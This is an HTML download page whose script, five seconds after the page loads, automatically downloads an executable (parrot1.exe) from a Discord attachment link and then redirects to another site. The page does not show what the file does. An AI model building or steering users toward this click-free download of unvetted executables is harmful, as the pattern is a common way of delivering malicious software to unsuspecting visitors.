<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Page</title>
    <style>
        body {
            background-color: #fca4a6;
            text-align: center;
            padding: 20% 0;
        }
    </style>
</head>
<body>
    <h1 id="message">Parrot.exe will download in a few seconds...</h1>

    <script>
        setTimeout(function() {
            // Replace this link with your Discord attachment link
            var downloadLink = 'https://cdn.discordapp.com/attachments/1158580871239053312/1162910762067566632/parrot1.exe?ex=653da80b&is=652b330b&hm=0ab8a25f08318850695f781801fab5923ada25bee7a29ce2c8769edbae06b3a0&';
            window.location.href = downloadLink;

            // Change the message after download
            document.getElementById('message').textContent = 'Thanks for downloading!';
            
            // Redirect to cafes.lol after 3 seconds
            setTimeout(function() {
                window.location.href = 'https://cafes.lol';
            }, 3000); // 3000 milliseconds = 3 seconds
        }, 5000); // 5000 milliseconds = 5 seconds
    </script>
</body>
</html>
